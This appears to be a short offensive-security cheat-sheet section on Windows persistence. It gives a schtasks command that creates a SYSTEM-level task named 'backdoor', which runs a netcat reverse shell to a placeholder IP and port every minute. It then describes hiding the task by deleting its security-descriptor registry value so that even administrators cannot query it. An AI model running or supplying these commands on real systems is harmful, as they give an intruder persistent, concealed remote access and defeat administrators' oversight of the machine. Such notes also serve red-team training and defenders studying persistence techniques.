### Scheduling tasks
- Create a task that runs every minutes and runs a reverse shell
```powershell
# Create a task
schtasks /create /sc minute /mo 1 /tn backdoor /tr "c:\tools\nc64 -e cmd.exe <IP> <PORT>" /ru SYSTEM

# Check the task
schtasks /query /tn backdoor
```

### Hiding the task
- We can delete the security descriptor (SD) of the task so that no user, not even administrator can query this task.
- SD is an ACL that defines which users have access to the tasks.
- SD of tasks are stored at `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\backdoor` under a key named `SD`.
- Changing the value is only allowed by SYSTEM.